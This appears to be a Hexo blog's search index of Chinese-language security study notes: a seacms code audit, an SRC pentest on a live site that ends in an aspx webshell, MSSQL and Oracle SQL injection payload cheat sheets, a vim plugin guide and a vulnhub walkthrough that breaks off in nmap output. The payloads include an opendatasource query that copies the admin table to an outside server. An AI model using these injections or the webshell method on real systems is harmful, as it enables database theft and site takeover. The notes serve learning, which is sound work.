<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>iseacms代码审计入门级</title>
      <link href="/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/"/>
      <url>/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-iseacms-熊海CMS-介绍🅰️">0x01 iseacms 熊海CMS 介绍🅰️</h1><p>熊海CMS是由熊海开发的一款可广泛应用于个人博客，个人网站，企业网站的一套网站综合管理系统。</p><p>简的来说，就非常合适刚刚入门的 代码审计案例（简单到会看一点点php代码的人都会的审计），今天来复盘一下</p><p><img src="1.jpg" alt="1"></p><p>（其实已经复盘过了，只是再复盘一遍来充实blog，嘻嘻😄）</p><h1 id="0x02-实战">0x02 实战</h1><p>需要用到 seay源代码审计系统</p><p><img src="2.jpg" alt="2"></p><p>个人喜欢直接上 自动审计所以，走一波</p><p><img src="3.jpg" alt="3"></p><p>seay自动审计出来的，一般不一定100%存在漏洞，它原理是正则去匹配那些函数，比如 eval() 可能就 会写上关于eval() 函数的正则匹配。嘛。不过比起手动慢慢的看，能省去很多麻烦。有能力的也可以先<strong>代码通读</strong> 再自动化审计，每个人方法不一，我就 用我的方法。</p><p><img src="4.jpg" alt="4"></p><p>点过去看到，带有正则匹配和转义的函数。</p><p>正则匹配**\W** 写死了。</p><p><img src="5.jpg" alt="5"></p><p>接着往上看</p><p>/seacmseditor/php/controller.php：11行</p><p><img src="6.jpg" alt="6"></p><p>这三个存在漏洞且能利用。</p><p>需要GET传参 action, <strong>switch 多选函数.</strong></p><p>先第一个uploadfile 上传打开抓包上传试一下。</p><p><img src="7.jpg" alt="7"></p><p>unicode 解码看一下\u672a\u77e5\u9519\u8bef =&gt; 未知错误 🙅</p><p>完美，未知错误</p><p>下一个，SQL注入</p><h1 id="0x03-多处SQL注入">0x03 多处SQL注入</h1><p>/files/content.php：19行</p><p><img src="8.jpg" alt="8"></p><p>加了 转义函数</p><p>可以使用 宽字节注入(有条件)</p><p>报错注入</p><p>这里就使用 报错注入 把</p><p><img src="9.jpg" alt="9"></p><p>宽字节注入需要 GBK编码</p><p><img src="10.jpg" alt="10"></p><p>白盒审计 源代码 里明显没有单独设置 编码所以是不行的。</p><p><img src="11.jpg" alt="11"></p><p>成功报出数据库</p><p>同样存在SQL注入的文件:</p><p>/files/software.php</p><p>/admin/files/reply.php</p><p>/admin/files/newlink.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mark-once-WebShell_01</title>
      <link href="/2020/04/10/takeshell-01/"/>
      <url>/2020/04/10/takeshell-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-起因🏴">0x01 起因🏴</h1><p>在做SRC活动的时候。扫描到一个 网站源码备份的网站，于是就打算进一步渗透。看看能不能拿SHELL</p><h1 id="0x02-网站SQL注入">0x02 网站SQL注入</h1><p>代码审计功底不太熟，就简单分析了一下文件内容。</p><p>知道了后台管理是/**system/下。然后就去网站看看能不能发现其他的漏洞</p><p><img src="image1.jpeg" alt="image1"></p><p>先走个流程信息收集下。</p><p><img src="E:%5CWeb%5CphpStudy16%5Cblog%5Cblg%5Csource_posts%5Ctakeshell-01%5Cimage3.jpeg" alt="image3"><img src="image2-1586436949788.jpeg" alt="image2"></p><p>惊了。Iis8.5 惹不起惹不起。</p><p>在一个地方找到了一个SQL注入</p><p><img src="image4.jpeg" alt="image4"></p><p><img src="image5.jpeg" alt="image5"></p><p>得劲🔥</p><p><img src="image6.jpeg" alt="image6"></p><p>发现sqlmap跑不出 密码❔于是 我上手工了</p><p><img src="image7.jpeg" alt="image7"></p><p>🖤得嘞。。直接扔进SOMD5里解密。</p><p>登录后台看看</p><p><img src="image8.jpeg" alt="image8"></p><p><img src="image9.jpeg" alt="image9"></p><p>。。。</p><p>。。。</p><p>。。。</p><p>找了一些。能上传的地方，但是都失败了。经验不足不太会。😩</p><p>正思考咋办的时候。突然灵光一闪🌞,咱们不是还有SQL注入嘛。还是MSSQL的数据库</p><p>直接上OS-SHELL</p><h1 id="0x03-WEBSHELL-🌄">0x03 WEBSHELL 🌄</h1><p><img src="image10.jpeg" alt="image10"></p><p>权限有点低嗷。🉑</p><p>上传一句话aspx小马</p><p><img src="image11.jpeg" alt="image11"></p><p><img src="image12.jpeg" alt="image12"></p><p><img src="image13.jpeg" alt="image13"></p><p>百度云的主机，惹不起</p><p>。。</p><p>。。</p><p>。。</p><p>到这里我也就不继续深究了。该删木马的都删了</p><p>本人菜鸟经验不足。提权那些。240个补丁，提不上。也没python环境，</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL_Blind_Injection</title>
      <link href="/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>不要问我为什么不配图。因为这个hexo老是渲染失败。搞的我直接裂开了。</p><p><img src="ADF1B901FABD5EA3559C8BE8518DBF08.jpg" alt></p><h1 id="0x01-MSSQL盲注-前期知识">0x01 MSSQL盲注_前期知识</h1><p>了解前。先有两个函数要先了解一下count(),object_id()<br>1.union all select count(*) from dbo.sysobjects</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">union all select count(*) from dbo.sysobjects</span><br><span class="line">count指是查询表的所有记录数，也就是无需去order by查询字段数。就能达成回显(只限于盲注8?)</span><br><span class="line">=========================================</span><br><span class="line">?id=1 union all select null,db_name(),null //查询当前库名</span><br><span class="line"></span><br><span class="line"> ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //查询当前所有库</span><br><span class="line"> dbid 是指数据库的id, master.dbo.sysdatabases 则是来查询库</span><br><span class="line">==========================================</span><br><span class="line"> object_id()</span><br><span class="line">简单的一句话总结就是 免去了 查询id</span><br><span class="line"> unino all select null,name,null from dbo.syscolumns where id=object_id(&apos;dbo.admin&apos;) //要注意这里要加单引号括起来</span><br></pre></td></tr></table></figure><h1 id="0x02-MSSQL盲注">0x02 MSSQL盲注</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#查询库名长度</span><br><span class="line">?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1</span><br><span class="line">====================================================</span><br><span class="line">#查询库名</span><br><span class="line">?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1</span><br><span class="line">===================================================</span><br><span class="line">#查询表名</span><br><span class="line">?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype=&apos;U&apos;)and ascii(substring(name,1,1))=100)=1</span><br><span class="line"></span><br><span class="line">?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype=&apos;U&apos; and name not in(&apos;zkaq&apos;))and ascii(substring(name,1,1))=100)=1</span><br><span class="line"></span><br><span class="line">tips: (top 1) 是指查询最大值的那一个</span><br><span class="line">==================================================</span><br><span class="line">#查询字段名</span><br><span class="line">(假设已猜出表名(zkaq666))</span><br><span class="line">?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id(&apos;dbo.zkaq666&apos;))and ascii(substring(name,1,1))=100)=1</span><br><span class="line">====================================================</span><br><span class="line">#查询字段内容</span><br><span class="line">(假设已猜出字段名(username))</span><br><span class="line">?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1</span><br></pre></td></tr></table></figure><h1 id="0x03-总结">0x03 总结</h1><p><strong>很他妈简单。看不懂的自己去试一试！</strong></p><hr><p><strong>参考连接link:<br><a href="https://blog.csdn.net/v_gbird/article/details/93981684" target="_blank" rel="noopener">https://blog.csdn.net/v_gbird/article/details/93981684</a><br><a href="https://blog.csdn.net/kuxing100/article/details/9670533" target="_blank" rel="noopener">https://blog.csdn.net/kuxing100/article/details/9670533</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle Injection</title>
      <link href="/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1><p>所用到的语句</p><ul><li>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(payload))</li><li>table_name&lt;&gt;‘ADMIN’    //&lt;&gt;意思是 不等于。也就是排除</li></ul><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select table_name from user_tables from rownum=1))</p><ul><li>⏫rownum指，限制输出只输出一个。查询表</li></ul><p><img src="5.jpg" alt="5"></p><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1))</p><p><img src="8.jpg" alt="8"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL Injection</title>
      <link href="/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1><p>union all select db_name()  //查询当前库名<br>union all select null,name,null from master.dbo.sysdatabases//查询数据库<br>union all select null,null,null from dbo.sysobjects //查询表<br>union all select null,null,null from dbo.syscolumns//查询字段</p><hr><p><strong>查询数据库</strong>💻</p><p>?id=1 union all select null,name,null from master.dbo.stsdatabases</p><p><img src="12312321321.jpg" alt="12312321321"></p><p><strong>查询表名</strong>📑</p><p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’</p><ul><li>⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表</li></ul><p><img src="2.jpg" alt="1"></p><p><strong>查询字段名</strong></p><p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p><ul><li><p>⏫ null是指3个字段。mssql里的字符串类型管理严格，有可能一个是int类型。或者str类型等。</p><p><img src="3.jpg" alt="2"></p></li></ul><p><strong>查询字段内容</strong></p><p>?id=1 union all select null,password,null from admin</p><p><img src="4.jpg" alt="3"></p><h1 id="0x02-MSSQL-反弹注入🎈">0x02 MSSQL 反弹注入🎈</h1><ul><li><strong>前言</strong>:</li></ul><p>这个是一个比较骚的操作。针对无回显注入点的时候。</p><h2 id="0x02-1-反弹注入原理">0x02.1 反弹注入原理</h2><ul><li>☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持</li><li></li></ul><h2 id="0x02-2-反弹注入条件">0x02.2 反弹注入条件</h2><ul><li>🌐需要一台外网主机，字段要相同</li></ul><h3 id="复现">复现</h3><ul><li>Payload🔫</li></ul><p>insert into opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p><ul><li>句子理解</li></ul><p>opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p><ul><li>建立temp表4个字段</li></ul><p>create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255))</p><ul><li>插入语句后查询</li></ul><p><img src="6.jpg" alt="6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim-vundle安装和配置</title>
      <link href="/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>想在pycharm使用 pwntools 但是 pwntools不支持windows。只能跑到Linux搞，但是Vim没有补全于是打算装个 补全插件。顺便写个笔记</p><p><strong>环境：Kali</strong></p><h1 id="0x01-Vundle插件管理安装">0x01 Vundle插件管理安装</h1><p>我用的是kali和普通安装有些不同。</p><p>第一步 git：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure><p>在 用户 下<strong>建立.vimrc文件</strong> 例子：</p><p>user:/user/.vimrc</p><p>root:/root/.vimrc</p><p>写上以下的句子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible              <span class="string">" be iMproved, required</span></span><br><span class="line"><span class="string">filetype off                  "</span> required</span><br><span class="line"></span><br><span class="line"><span class="string">" set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Plugin 'VundleVim/Vundle.vim'</span></span><br><span class="line"><span class="string">Plugin 'tpope/vim-fugitive'</span></span><br><span class="line"><span class="string">Plugin 'L9'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call vundle#end()            "</span> required</span><br><span class="line">filetype plugin indent on    <span class="string">" required</span></span><br></pre></td></tr></table></figure><p>打开VIM 直接打开不用配合其他文件什么的。</p><p>输入 :PluginInstall。安装完后更新一下 :PluginUpdate</p><p>等显示Done！的字的时候就代表的 安装/更新 成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call vundle#begin()</span><br><span class="line"></span><br><span class="line">'''#插件名称位置</span><br><span class="line"></span><br><span class="line">call vundle#end()</span><br></pre></td></tr></table></figure><p>如果我这里不详细，可以去github看原版的档案</p><p>地址：<a href="https://github.com/VundleVim/" target="_blank" rel="noopener">https://github.com/VundleVim/</a></p><h1 id="0x02-vim安装molokai配色方案">0x02 vim安装molokai配色方案</h1><p>我安装完插件后，字体没了颜色。我也没看出问题所在。字体颜色脚本都没有加载。所以我打算直接使用vim的插件。不使用自带的颜色脚本</p><p>直接git 下来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tomasr/molokai.git</span><br></pre></td></tr></table></figure><p>然后 mv molokai/ /usr/share/(你的vim版本)/colors/ 下。</p><p>并在.vimrc文件 后面加上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">colorsheme molokai</span><br><span class="line">let g:molokai_original=1</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=drak</span><br><span class="line">syntax on</span><br><span class="line">set nu!</span><br></pre></td></tr></table></figure><p>保存并退出。过会就会生效了。</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机_sunrise</title>
      <link href="/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/"/>
      <url>/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。</p><p>可没想到一个坑，坑了我两天半，共用计两天半。</p><p>有句话我想讲一下 **************************!!!</p><h1 id="0x01-Sunrise">0x01 Sunrise</h1><p>靶机地址: <a href="https://download.vulnhub.com/sunset/sunrise.7z" target="_blank" rel="noopener">https://download.vulnhub.com/sunset/sunrise.7z</a></p><p>作者: whitecr0wz</p><p>难度: Beginner(新手)</p><h3 id="0x01-1-信息收集">0x01.1 信息收集</h3><p>nmap -n -T4 172.16.123.109 -A</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CST</span><br><span class="line">Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 172.16.123.109</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA)</span><br><span class="line">|   256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA)</span><br><span class="line">|_  256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 612   2019-11-25 05:35  index.nginx-debian.html</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL, RPCCheck:</span><br><span class="line">|_    Host '172.16.123.230' is not allowed to connect to this MariaDB server</span><br><span class="line">8080/tcp open  http-proxy Weborf (GNU/Linux)</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 202</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error 404<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Page not found <span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 326</span><br><span class="line">|     <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">"background-color: #DFDFDF;"</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"html/"</span>&gt;</span>html/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>-<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">|   HTTPOptions, RTSPRequest, SIPOptions:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span><br><span class="line">|     DAV: 1,2</span><br><span class="line">|     DAV: <span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span></span><br><span class="line">|     MS-Author-Via: DAV</span><br><span class="line">|   Socks5:</span><br><span class="line">|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 199</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|_    <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error 400<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Bad request <span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE</span><br><span class="line">|_http-server-header: Weborf (GNU/Linux)</span><br><span class="line">|_http-title: Weborf</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span><br><span class="line">|   WebDAV type: Apache DAV</span><br><span class="line">|_  Server Type: Weborf (GNU/Linux)</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,4D,"I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20a</span><br><span class="line">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck</span><br><span class="line">SF:,4D,"I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20allo</span><br><span class="line">SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:etRequest,187,"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r</span><br><span class="line">SF:\nContent-Length:\x20326\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C</span></span><br><span class="line"><span class="meta">SF://DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;</span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>/<span class="attr">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Name<span class="tag">&lt;/<span 